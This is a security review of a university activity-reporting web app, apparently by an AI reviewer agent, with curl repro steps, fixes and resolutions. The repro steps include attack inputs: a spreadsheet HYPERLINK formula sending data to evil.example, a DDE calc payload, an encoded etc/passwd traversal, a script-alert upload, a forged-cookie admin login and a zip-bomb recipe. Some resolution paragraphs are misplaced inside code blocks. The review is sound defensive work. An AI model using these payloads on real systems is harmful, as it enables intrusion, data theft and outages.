# Security review: SIM Realisasi app layer

- **Reviewer:** ECC security-reviewer agent
- **Date:** 2026-10-01
- **Scope:** `app/`, `components/`, `lib/`, `middleware.ts`, and how they use the DB RPC layer. The SQL in `supabase/migrations` was reviewed separately (`database-review.md`) and is only touched here where the app depends on it.
- **References:** Rules §10, Architecture §5, CONTRACTS §6/§8, UU PDP privacy requirements.

## Method

1. **Static review** of every route handler, every server action (`lib/realisasi/actions/*`), the session and DB helpers, the storage facade, the Excel export registry and workbook writer, and all `href` / redirect sinks.
2. **Dynamic tests** against an isolated environment:
   - DB `sim_realisasi_sec`, rebuilt with `scripts/db-reset.sh`
   - a copy of the repo running under `next dev -p 3301`
   - every request sent with `curl` and the `demo_uid` cookie of each of the 8 seed accounts
3. **Server actions** were called directly through their `Next-Action` ids, which come from `.next/server/server-reference-manifest.json`.

Shell helpers used in the repro steps below:

```bash
B=http://localhost:3301
U(){ echo "demo_uid=00000000-0000-4000-8000-00000000000$1"; }   # 1 admin, 2 IO partnership, 3 IO mobility,
                                                               # 4 FTI, 5 FBE, 6 Prodi Inf., 7 FSD (submitters), 8 viewer
act(){ curl -s -X POST $B/realisasi -b "$(U $1)" -H "Next-Action: $2" -H 'Accept: text/x-component' \
            -H 'Content-Type: text/plain;charset=UTF-8' --data "$3" | grep -a '^1:'; }
```

## Summary

| Severity | Count |
|---|---|
| CRITICAL | 0 |
| HIGH | 1 |
| MEDIUM | 2 |
| LOW | 8 |
| INFO | 6 |

The authorization model holds up well. Every page, API route and server action we tested rejected access across units, across roles and without a session (see the "Verified OK" table at the end). The findings are about:

- PII exposure through the lookup endpoints
- denial-of-service resilience
- HTTP hardening
- production readiness of the demo session

---

## HIGH

### H-1: Any signed-in account can bulk-scrape the BAAK and HR registries (names, faculty, study programme, status), and the rate limit does not prevent it

**Where**
- `app/api/lookup/students/route.ts:12-35` and `app/api/lookup/employees/route.ts:12-35`: no role check after `getSessionUser()`.
- `lib/realisasi/schemas/participants.ts:81,86`: up to **200 ids per request**.
- `lib/rate-limit.ts:123`: 60 requests per minute per user, held in process memory.

**Problem**

The lookup routes return the full registry record for any NRP or employee ID to **any** authenticated user, including the `viewer` role and IO Partnership. The student record includes:

- `full_name`, `faculty_name`, `prodi_name`, `intake_year`, `status`
- for inbound students, `home_institution` and `home_country_code`

Rules §10 lets IO Partnership see **counts only** and gives viewers **no** access to participant names. Architecture §5 says the lookups are rate-limited "to prevent registry scraping". But 60 requests × 200 ids is **12,000 records per minute per account**, and NRPs follow a predictable pattern (`<faculty letter><2-digit year><digits>`). Under UU PDP this is a personal-data disclosure to roles that have no purpose for it.

**Repro (viewer account)**
```bash
curl -s -b "$(U 8)" -X POST $B/api/lookup/students -H 'content-type: application/json' \
  -d '{"nrps":["A11235253","A11252034"],"section":"internal"}'

**Resolution (fixed, app fix):** (1) Both lookup routes and the template parser now answer 403 unless `canLookupRegistry(user)` holds: submitter, io_admin, or io_staff on the mobility team (`lib/api-guard.ts`). The DB side is enforced too (WP-DB amendment 28: `lookup_students`/`lookup_employees` raise `AUTH_FORBIDDEN` and cap at 500 ids). (2) Requests stay capped at 200 ids (`MAX_LOOKUP_IDS`). A second limiter counts **ids** (distinct per request): 600 ids per 10 minutes per user (`lookupIdLimiter`), on top of 60 requests per minute, so one account gets about 3,600 records/hour instead of 720,000. (3) Responses are minimised (`publicStudentResult`/`publicEmployeeResult`): only name, faculty and prodi, plus home institution/country for the inbound section. Blocking rows (wrong section, not found) carry no person record, and `intake_year`, `faculty_code`, `category` and `position` are dropped. Lookup routes also require `Content-Type: application/json`. Not done: (4) a shared-store limiter and lookup audit log for multi-instance production (needs Redis or a DB table owned by the DB layer). Tests: `lib/rate-limit.test.ts` (weighted budget) and `e2e/security.spec.ts` (viewer/partnership 403, submitter 200 without `intake_year`, 201 ids → 400).
# 200 {"results":[{"nrp":"A11235253",...,"student":{"full_name":"Benedict Kusuma","faculty_name":"Fakultas Teknik Sipil dan Perencanaan","prodi_name":"Teknik Sipil",...,"intake_year":2023,"status":"graduated"}}, ...]}
curl -s -b "$(U 2)" -X POST $B/api/lookup/employees -H 'content-type: application/json' -d '{"ids":["PG204517"]}'
# 200 {... "full_name":"Ir. Bambang Sutrisno, M.T.","unit_name":"Prodi Teknik Elektro","position":"Lektor Kepala" ...}
for i in $(seq 62); do curl -s -o /dev/null -w '%{http_code}\n' -b "$(U 8)" -X POST $B/api/lookup/students \
  -H 'content-type: application/json' -d '{"nrps":["A11235253"],"section":"internal"}'; done | sort | uniq -c
#  60x 200, then 429. The limit counts requests, not ids.
```

**Fix**
1. Gate both routes on roles that edit participants: submitters, IO Mobility and IO Admin. Return 403 to viewers and to IO staff who are only on the Partnership team:
   ```ts
   const mayLookup = user.role === 'submitter' || user.role === 'io_admin' || (user.role === 'io_staff' && user.teams.includes('mobility'));
   if (!mayLookup) return Response.json({ code: 'AUTH_FORBIDDEN', message: ERROR_MESSAGES.AUTH_FORBIDDEN }, { status: 403 });
   ```
   Apply the same check inside `realisasi.lookup_students` / `lookup_employees` (today they only check `auth.uid() is not null`) so the database stays authoritative.
2. Rate-limit by **ids**, not by requests. For example, keep `lookupLimiter` and add a second limiter of about 300 ids per 10 minutes per user. Lower the per-request cap to about 50.
3. Return only the fields the wizard needs: name, faculty/prodi, and status as a blocking flag. Drop `intake_year`.
4. Production: put the limiter in a shared store (Redis or a DB table), because per-process memory is bypassed when there is more than one instance. Log lookups (actor, count) for audit.

---

## MEDIUM

### M-1: Decompression bomb in the participant template upload: one small `.xlsx` drives the server to multi-GB memory use

**Where:** `app/api/template/peserta/route.ts:77-121`, specifically `wb.xlsx.load(data)` at line 102.

**Problem**

Any authenticated user (no role gate) can POST up to 10 MB of `.xlsx`. ExcelJS inflates and parses the whole workbook in memory.

- **Measured:** a **284 KB** file that inflates to about 100 MB raised the dev server's peak RSS by **about 375 MB** and took 3.3 s.
- **Projected:** a 10 MB file holding the same highly compressible XML would inflate to several GB and OOM-kill the Node process. That is an authenticated denial of service for everyone.

**Repro**
```bash

**Resolution (fixed, app fix):** `/api/template/peserta` (a) is limited to the same roles as H-1 and to 20 parses per 10 minutes, (b) refuses bodies over 512 KB before buffering (Content-Length and file size), (c) walks the zip central directory (`lib/excel/zip-guard.ts`) and inflates every entry with a hard `maxOutputLength`, rejecting archives with more than 64 entries or more than 5 MB uncompressed in total, even when the headers lie about sizes, before ExcelJS loads anything, and (d) refuses sheets with more than 1,001 rows and returns at most 1,000 ids. Rejections answer 413 `R13_FILE_TOO_LARGE` with "Berkas template terlalu besar. Maksimal 512 KB dan 1.000 baris ID; gunakan template yang disediakan." Tests: `lib/excel/zip-guard.test.ts` (honest and lying bombs, too many entries, real template OK) and an e2e bomb upload returning 413.
# bomb.xlsx = a valid workbook whose sheet1.xml holds 100,000 rows of 1,000×'A' (built with python zipfile)
curl -s -o /dev/null -w '%{http_code} %{time_total}s\n' -b "$(U 8)" -F kind=students \
  -F "file=@bomb.xlsx;filename=b.xlsx" $B/api/template/peserta
# 200 3.29s. Server VmHWM went from 2.50 GB to 2.88 GB.
```

**Fix**
- Parse the template in the browser (SheetJS in the client component). The ids are only fed back to `/api/lookup/*` anyway. Then delete the server parse.
- If parsing must stay on the server:
  - cap the upload at about 512 KB (a 1,000-row id list is a few KB);
  - inspect the zip central directory first and reject the file when the total uncompressed size is over about 5 MB or any entry's compression ratio is over 100;
  - use `new ExcelJS.stream.xlsx.WorkbookReader(...)` and stop after 1,001 rows;
  - limit the route to roles that edit participants (same gate as H-1).

### M-2: No security response headers (CSP, frame-ancestors / X-Frame-Options, HSTS, Referrer-Policy)

**Where:** `next.config.ts` has no `headers()` and no `poweredByHeader: false`. `middleware.ts` adds no headers.

**Problem**

- **Clickjacking:** any site can frame the app. The verification pages have one-click approve, reject and link-duplicate buttons, and the settings page has freeze and refreeze.
- **No CSP:** nothing contains a future XSS bug.
- **No HSTS:** the session cookie can travel over plain HTTP (see L-2).
- **`X-Powered-By: Next.js`:** advertises the framework.

**Repro**
```bash
curl -s -D - -o /dev/null -b "$(U 1)" $B/realisasi | grep -iE 'content-security|x-frame|strict-transport|referrer-policy|x-powered'

**Resolution (fixed, app fix):** `next.config.ts` sets `poweredByHeader: false` and sends on every route: CSP (`default-src 'self'`, `script-src 'self' 'unsafe-inline'` (+`'unsafe-eval'` only in dev), `style-src 'self' 'unsafe-inline'`, `img-src 'self' data: blob:`, `font-src 'self' data:`, `connect-src 'self'`, `frame-src 'self'`, `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, `frame-ancestors 'self'`), `X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` (camera, microphone, geolocation, payment, usb off), COOP same-origin, and `Strict-Transport-Security` in production builds. `'unsafe-inline'` scripts are needed because the App Router streams its RSC payload in inline scripts; a nonce policy needs middleware plus dynamic rendering, and is left for production. `'unsafe-inline'` styles are needed for the inline `style` attributes set by Recharts, Radix and sonner. Framing is `'self'`, not `'none'`, because the queue previews IA/IR PDFs in same-origin iframes. `/api/files` gets only `frame-ancestors 'self'`, because Chrome's PDF viewer does not render under `object-src 'none'`; `Content-Security-Policy: sandbox` was not added for the same reason. Test: `e2e/security.spec.ts` M-2.
# X-Powered-By: Next.js   (and nothing else)
```

**Fix** (`next.config.ts`)
```ts
poweredByHeader: false,
async headers() {
  return [{ source: '/:path*', headers: [
    { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" },
    { key: 'X-Frame-Options', value: 'DENY' },
    { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
    { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains' },
    { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  ] }];
},
```
Move to a nonce-based `script-src` (set in middleware) once the app leaves mockup status. `/api/files` responses can also carry `Content-Security-Policy: sandbox` so an uploaded PDF or image renders in an opaque origin.

---

## LOW

### L-1: API POST routes have no Origin / CSRF check (`/api/upload`, `/api/template/peserta`, `/api/lookup/*`)

**Where:** `app/api/upload/route.ts:36`, `app/api/template/peserta/route.ts:77`, and the lookup routes.

**Problem**

Server actions get Next's built-in Origin check: a forged `Origin` returned **500** in testing. Route handlers get no such check. `SameSite=Lax` blocks cross-*site* POSTs, but a page on any **same-site** host (any `*.petra.ac.id` subdomain, including student or legacy hosts) can submit a `multipart/form-data` form. That form would attach files to the victim's draft or revision, or create a participant draft.

The lookup routes also accept `text/plain` bodies, because `request.json()` ignores the content type, so a lookup needs no CORS preflight.

**Repro**
```bash
curl -s -H 'Origin: https://evil.petra.ac.id' -H 'Sec-Fetch-Site: cross-site' -b "$(U 7)" \
  -F activity_id=a0000000-0000-4000-8000-000000000023 -F target=evidence \
  -F "file=@poly.pdf;type=application/pdf;filename=csrf.pdf" $B/api/upload

**Resolution (fixed, app fix):** `middleware.ts` refuses non-GET `/api/*` requests with 403 when `Sec-Fetch-Site` is `cross-site`/`same-site` or `Origin` differs from the host (`lib/origin-check.ts`, unit-tested). Lookup routes require JSON. e2e: a POST with `Origin: https://evil.petra.ac.id` gets 403.
# 200 {"id":67, ... "kind":"evidence"}
```

**Fix**
- Add a shared guard to every non-GET `/api/*` handler, or put it in `middleware.ts`. Reject when `Origin` is present and does not equal the app origin, or when `Sec-Fetch-Site` is `cross-site` or `same-site`.
- In the lookup routes, require `Content-Type: application/json`.

### L-2: Session cookie is missing `Secure` and is a long-lived bearer value

**Where:** `lib/realisasi/actions/session.ts:14-19`.

**Observed:** `Set-Cookie: demo_uid=…0004; Path=/; Max-Age=604800; HttpOnly; SameSite=lax`.

**Problem:** The cookie has no `Secure` flag. The value is a fixed, guessable profile UUID that never expires on the server and cannot be revoked.

**Fix:**
- Now: set `secure: process.env.NODE_ENV === 'production'`.
- Production: see I-1. Use an opaque, random, server-side session or Supabase Auth JWT. Use the `__Host-` prefix, `SameSite=Lax`, rotate the session on login, and keep it short-lived with sliding renewal.

**Resolution (partly, app fix):** `secure` is set in production builds (`sessionCookieSecure()`; `SESSION_COOKIE_SECURE=0` opts out for a plain-HTTP demo host). The opaque server-side session, `__Host-` prefix and rotation belong to the real-auth work (I-1).

### L-3: Image uploads are not content-checked, so arbitrary bytes can be stored as `image/png` or `image/jpeg`

**Where:** `lib/storage.ts:34-35`. Only PDFs get a magic-byte check. The DB `storage_put` behaves the same way.

**Problem:** An HTML or script payload uploaded with `type=image/png` is accepted and served back. The response has `Content-Type: image/png` and `nosniff`, so browsers will not render it as HTML today. But the storage can be used to host arbitrary content, and R-13 (only PDF, JPG and PNG allowed) is not actually enforced.

**Repro**
```bash
curl -s -b "$(U 7)" -F activity_id=a0000000-0000-4000-8000-000000000023 -F target=evidence \
  -F "file=@x.html;type=image/png;filename=pic.png" $B/api/upload        # 200, id 64
curl -s -b "$(U 7)" $B/api/files/realisasi-files/a0000000-0000-4000-8000-000000000023/evidence/<uuid>.png

**Resolution (fixed, app fix):** `validateUpload` requires the content to match the declared type for images too (JPEG `FF D8 FF`, PNG signature), not only for PDFs. The upload route stores the **sniffed** mime type and derives the extension from it. Mirroring this in `storage_put` is DB-side (amendment 23 already enforces PDF magic for IA/IR). Test: `lib/storage.test.ts`.
# <html><script>alert(document.domain)</script></html>
```

**Fix:**
- In `validateUpload`, require the JPEG magic `FF D8 FF` or the PNG magic `89 50 4E 47 0D 0A 1A 0A` when the type is `image/*`.
- Set the stored mime from the sniffed type, not from `file.type`.
- Mirror the check in `realisasi.storage_put`.
- Production: consider re-encoding images server-side.

### L-4: `/api/files` accepts encoded `/` and NUL bytes inside path segments

**Where:** `app/api/files/[...path]/route.ts:31-35`.

**Problem**

- Segments are URL-decoded and then rejected only when they are exactly `''`, `.` or `..`. So `..%2F..%2Fetc` passes the app check and becomes `realisasi-files/../../etc/...`.
- Today this is harmless: the blob lookup is an exact match in the DB, and `storage_put` rejects `..`.
- But `lib/storage.ts` is described as the "swap point for Supabase Storage". With an object-store or filesystem backend, this check alone would not prevent traversal.
- A `%00` makes Postgres raise `22021`, which comes back as a 500 INTERNAL error.

**Repro**
```bash
curl -s -b "$(U 5)" "$B/api/files/realisasi-files/..%2F..%2Fetc/passwd"           # 403 (from the DB, not the route)
curl -s -b "$(U 5)" "$B/api/files/realisasi-transcripts/a0000000-0000-4000-8000-000000000002/v1/X01250024-81ed5df4.pdf%00"  # 500
```

**Fix:** Validate the decoded path against a strict grammar before any I/O, and answer 404 otherwise:
```ts
const OK = /^(realisasi-files\/[0-9a-f-]{36}\/(ia|ir|evidence)\/[0-9a-f-]{36}\.(pdf|jpg|png|bin)|realisasi-transcripts\/[0-9a-f-]{36}\/v\d+\/[A-Z0-9]+-[0-9a-f]{8}\.pdf)$/;
```

**Resolution (fixed, app fix):** `/api/files` decodes each segment, refuses segments containing `/`, and validates the joined key against the strict grammar of the keys this app writes (`isValidStoragePath`) before any I/O. Anything else, including `%2F`, `..` and `%00`, returns 404. Tests: `lib/storage.test.ts` and e2e.

### L-5: No quotas or rate limits on uploads, exports or template parsing; orphan transcripts accumulate

**Where:** `app/api/upload/route.ts`, `app/api/export/[kind]/route.ts`, `app/api/template/peserta/route.ts`.

**Problem**
- A unit editor can upload an unlimited number of 10 MB files. Each transcript upload writes a new random path even if no participant row ever references it, so blobs are never cleaned up.
- Exports rebuild whole workbooks (for example `activities` and `participants` across all years) on every request, with no limit.
- Together these let one account fill the DB, since blobs are `bytea` in `file_blobs`, or keep CPU busy.

**Fix:**
- Apply a per-user limiter to upload and export, for example 30 uploads and 20 exports per 10 minutes.
- Set a per-activity storage quota.
- Run a cleanup job that removes transcript blobs not referenced by any `participant_students.transcript_path` after 24 hours.

**Resolution (partly, app fix):** per-user limiters were added for uploads (60 per 10 minutes, plus an early Content-Length check), Excel exports (40 per 10 minutes) and template parsing (20 per 10 minutes). Not done: per-activity storage quotas and the orphan-transcript cleanup job, which are DB/job-side (`file_blobs`, `run_daily_jobs`).

### L-6: Formula-looking text is not neutralised in exports

**Where:** `lib/excel/workbook.ts:64-80` (`coerce`).

**Finding:** We created a known activity titled `=HYPERLINK("http://evil.example/?"&A1,"klik")` and a reference `@SUM(1+1)*cmd|' /C calc'!A0`, then exported `known-activities`. ExcelJS wrote both values as **shared strings** (no `<f>` element), so Excel shows them as text and does not evaluate them. **The .xlsx exports are not exploitable as they stand.**

**Residual risk:** If a user re-saves the file as CSV, or edits the cell and presses Enter, the value becomes a live formula. The only check on free-text fields is length (activity names, known titles and references, notes).

**Repro**
```bash
act 2 400b54d02a2aded1c741acaf23fb6396e9b7074d9a '[{"title":"=HYPERLINK(\"http://evil.example/?\"&A1,\"klik\")","activity_date":"2026-01-01","is_international":true,"source":"other"}]'
curl -s -b "$(U 2)" -o known.xlsx $B/api/export/known-activities && unzip -p known.xlsx xl/sharedStrings.xml | grep -o 'HYPERLINK[^<]*'
```

**Fix (defence in depth):**
- In `coerce`'s default branch, prefix a `'` (U+0027) to strings that match `/^[=+\-@\t\r]/`, or set `cell.value = { richText: [{ text }] }`.
- Use the same helper for any future CSV export.

**Resolution (fixed, app fix):** `lib/excel/workbook.ts` `coerce` passes every text cell through `neutralizeFormula`, which prefixes `'` when the text starts with `= + - @ TAB CR`. Test: `workbook.test.ts`.

### L-7: Vulnerable or outdated dependencies (npm audit, production tree)

**Finding:** `npm audit --omit=dev` reports 1 high and 3 moderate:
- `postcss` (high): XSS in stringify, and file read via `sourceMappingURL`. It is pulled in through `next`.
- `uuid` (moderate): reached through `exceljs`.

Both are build-time or non-reachable paths in this app, so the real exposure is low.

**Fix:** Upgrade `next` within 15.5.x when a patched release that bundles postcss ≥ the fixed version is available. Pin with `overrides` (`"postcss": "^8.5.x"`, `"uuid": "^11"`), then rerun `npm audit`.

**Resolution (not fixed, app fix):** upgrading `next`/overriding `postcss`/`uuid` changes `package.json`/lockfile and needs `npm install`, which this pass had to avoid. The reachable exposure is build-time only.

### L-8: Defence-in-depth gaps in the DB helper (superuser connection, no `server-only` guard)

**Where:** `lib/db.ts:26` (default `postgresql://postgres@…`), `lib/db.ts`, `lib/session.ts`.

**Problem**
- **Superuser connection.** The pool connects as the **superuser** `postgres`. RLS works only because `withUser` runs `set local role authenticated`. If any future query is built with `sql.unsafe` or string concatenation, an injected `reset role` would make it a full superuser.
  - None exists today: every query uses the tagged template and parameters, and `sql.unsafe` appears nowhere.
  - `withSystem` is used only in `lib/session.ts`, for the profile, account list, `today()` and `demo_today`, exactly as documented.
- **No `server-only` guard.** `lib/db.ts` and `lib/session.ts` do not `import 'server-only'`. So an accidental import from a client component would fail only at runtime instead of at build time. Today no client component imports them: `components/**/'use client'` files import only the `MAX_FILE_BYTES` constant and type-only `Tx` from `lib/storage`. The built `.next/static` contains no `DATABASE_URL` or connection strings.

**Fix:**
- Connect as a dedicated low-privilege login role (`NOINHERIT`, a member of `authenticated` only) and keep a separate pool for the few `withSystem` reads.
- Add `import 'server-only'` to `lib/db.ts`, `lib/session.ts`, `lib/excel/*`, `lib/realisasi/queries/*`.
- Add an ESLint `no-restricted-syntax` rule banning `sql.unsafe` / `tx.unsafe`.

**Resolution (not fixed, app fix):** `import 'server-only'` needs the `server-only` package (not installed; no new packages in this pass), and the ESLint rule needs `eslint.config.mjs` (out of this pass's file scope). The low-privilege login role is DB/ops work. No `sql.unsafe` exists today.

---

## INFO

### I-1: The demo role switcher is unauthenticated (by design for the mockup)

**Where:** `lib/realisasi/actions/session.ts:10-21`, `lib/session.ts:79-89`, `middleware.ts`.

**Problem:** The session is the raw `public.profiles.id` in `demo_uid`, and the seed ids are fixed (`00000000-0000-4000-8000-00000000000N`). Anyone can become IO Admin with `curl -b demo_uid=00000000-0000-4000-8000-000000000001`. `loginAs` can also be called directly:
```bash
curl -s -D - -o /dev/null -X POST $B/login -H 'Next-Action: 40e4bbe411e477ab9c93e0aaa2d383e14ef29a0575' \
  -H 'Content-Type: text/plain;charset=UTF-8' --data '["00000000-0000-4000-8000-000000000001"]'   # 303 + Set-Cookie
```

**Production guidance (would be CRITICAL if shipped):**
- Replace the switcher with institutional SSO (Supabase Auth with SAML/OIDC).
- Derive `auth.uid()` from a verified JWT: verify the signature in middleware *and* in `getSessionUser`. Never take an identifier straight from a cookie.
- Delete `loginAs` and `listDemoAccounts`, and remove `/login` from the app.
- Keep `withUser`, but pass the verified JWT claims instead of a cookie value.

**Resolution (fixed, app fix):** the switcher is now gated: `DEMO_AUTH` is on by default for the mockup, and `DEMO_AUTH=0` disables it (no accounts listed, `loginAs` refused, `demo_uid` ignored by `getSessionUser`). The login page shows a warning that the mode is unauthenticated and demo-only. Documented in `lib/session.ts`. Replacing it with SSO and verified JWTs remains production work.

### I-2: The login page lists every account and email to anonymous visitors

**Where:** `app/(auth)/login/page.tsx:13-24`, which reads through `listDemoAccounts()` using `withSystem`.

This is expected for the demo. Remove it together with I-1.

**Resolution (fixed, app fix):** covered by the I-1 gate (`DEMO_AUTH=0` lists no accounts).

### I-3: The middleware matcher skips every path that starts with `login`

**Where:** `middleware.ts:21`, `'/((?!_next/|favicon.ico|login).*)'`.

**Problem:** Any future route such as `/login-history` or `/loginAudit` would skip the cookie guard. It is harmless today: `/loginx` returns 404, and every page and route calls `requireUser`/`getSessionUser` itself.

**Fix:** Use `'/((?!_next/|favicon\\.ico$|login$).*)'`.

**Resolution (fixed, app fix):** the matcher is now `'/((?!_next/|favicon\\.ico$|login$).*)'`.

### I-4: Next middleware truncates upload bodies over 10 MB, so near-limit files fail with a generic error

**Where:** `/api/upload` (Next.js `middlewareClientMaxBodySize`, default 10 MB).

**Problem:** Because middleware runs on `/api/upload`, Next only lets the first 10 MB of the body through. The log says "Request body exceeded 10MB for /api/upload". An over-limit file then fails `formData()` with **400 BAD_REQUEST** instead of `R13_FILE_TOO_LARGE`. A legitimate PDF just under 10 MB also fails once multipart overhead pushes the body over the limit.

**Fix:**
- Exclude `/api/upload` from the middleware matcher (the route checks the session itself), or raise `experimental.middlewareClientMaxBodySize` to `'11mb'`.
- Also reject on `Content-Length` > 10.5 MB before calling `formData()`.

**Resolution (fixed, app fix):** `experimental.middlewareClientMaxBodySize: '11mb'`, and `/api/upload` rejects a Content-Length over 10.5 MB with `R13_FILE_TOO_LARGE` (413) before calling `formData()`.

### I-5: Transcript and participant *views* are not access-logged

**Where:** `/api/files` (transcripts), participant tab.

**Problem:** R-63 is met for exports: all 76 allowed exports in the matrix test wrote an `export_log` row, with `contains_personal_data = true` for `participants`. But opening or downloading a transcript PDF through `/api/files/realisasi-transcripts/...` leaves no trace. That data is the most sensitive in the system.

**Fix:** For UU PDP accountability, log transcript reads (actor, activity, path, time) in the same transaction as `storage_get`.

**Resolution (not fixed, app fix):** transcript read logging must be written in the same transaction as `storage_get` (DB-side).

### I-6: Business error `detail` is passed through to clients

**Where:** `lib/realisasi/errors.ts:278-281`.

**Finding:** For example, R16 returns the NRP lists. No stack traces, SQL text or internal messages reach clients: unexpected errors become `INTERNAL` and are only logged on the server, and `22P02` becomes `BAD_REQUEST`. This is fine as it stands. Keep `detail` limited to user-supplied values.

**Resolution (no action, app fix):** no change needed.

---

## Verified OK (tested, no finding)

| Area | Result |
|---|---|
| Middleware coverage | `/`, `/realisasi/**` and `/kerjasama/**` redirect to `/login` without a cookie, and every `/api/*` route returns 401. A forged or invalid `demo_uid` gives 307/401. Every page calls `requireUser`, every route `getSessionUser`, and every exported server action `requireUser`; a cookieless action call gives 307 to `/login`. Server actions with a foreign `Origin` are rejected (500, Next's built-in check). |
| `/api/files` IDOR (role × file) | Transcript of activity 0002 (FTI): admin, Mobility and the FTI submitter get 200. IO Partnership, the other units (FBE, Prodi Inf., FSD) and the viewer get **403**. IA file of 0002: IO and viewer (verified) get 200, other units 403. A draft's evidence is 403 for other units and the viewer. |
| `/api/export/[kind]` × 8 roles (AT-11) | All 96 combinations match `can()` and Rules §10. `participants` is 403 for IO Partnership and the viewer. `snapshot`/`snapshot-archive` are 403 for submitters. `known-activities`/`duplicates` are 403 for submitters and the viewer. Contents are correctly scoped: each submitter's `participants`/`activities` file contains only their own unit, and viewer and IO-staff snapshots carry no `1.1 Peserta` sheet. The KPI drilldown has counts only. All 76 allowed exports were logged. |
| Server actions with other users' ids | Examples: FBE `submitActivity`/`deleteDraft`/`addEvidenceLink` on FSD draft 0023 gives NOT_FOUND. FBE `partnershipApprove` gives NOT_FOUND. Mobility `partnershipReject` gives AUTH_FORBIDDEN. Viewer `editVerifiedActivity` gives AUTH_FORBIDDEN. IO Partnership `commitParticipantEdit`/`ensureParticipantDraft` gives AUTH_FORBIDDEN. FBE and viewer `removeActivityFile(64)` (FSD file) give NOT_FOUND, Partnership gives FORBIDDEN. Submitter `updateSettings` and Partnership `setDemoToday` give AUTH_FORBIDDEN. Submitter and viewer `createKnownActivity` and `getKnownSuggestions` give AUTH_FORBIDDEN. `listNotifications` returns only the caller's own rows. |
| Upload checks | A cross-unit upload gives FILE_FORBIDDEN, and a cross-unit transcript upload gives NOT_FOUND or FORBIDDEN. An HTML file sent as `application/pdf` is rejected by the magic-byte check. `image/svg+xml` is rejected. Client filenames are stripped of directories, quotes and control characters, and the storage key is a server-generated UUID with an allow-listed extension, so `../../etc/passwd` is stored as `<uuid>.bin`. `nrp` is regex-checked (`../X` gives 400). `register_activity_file` / `save_participants` bind paths to the activity id. |
| Served file headers | `Content-Type` comes from an allow-list (pdf/jpeg/png), with `X-Content-Type-Options: nosniff`, `Cache-Control: private, no-store`, and `Content-Disposition` escaped for both the ASCII and `filename*` forms. |
| XSS | No `dangerouslySetInnerHTML`, `innerHTML`, `eval` or `new Function` anywhere. Evidence links must match `^https?://` in both zod (`lib/realisasi/schemas/activity.ts:132-139`) and `add_evidence_link`, so `javascript:` is impossible. Notification links are built server-side from fixed templates. |
| Open redirect | Every `redirect()` and `router.push()` target is a constant or an internal path built from validated ids. `/kerjasama/dokumen/[id]` uses a digit-only regex. The middleware clears the query string. |
| SQL injection | Every query uses postgres.js tagged templates with explicit casts. `markNotificationsRead` builds its `bigint[]` literal only after an `isSafeInteger` check on every element. |
| Error leakage | Unexpected DB errors are mapped to `INTERNAL`, and stack traces appear only in the server log. |
| Client bundle | No connection strings or secrets in `.next/static`. `.env.local` is git-ignored, and only `.env.example` is tracked. |
| PII in pages | We scanned every page (dashboard, lists, verification queues, duplicates, reports, notifications, detail/peserta/riwayat tabs) as IO Partnership, viewer and an unrelated submitter for all 40 seeded NRP/name pairs: **0 hits**. |
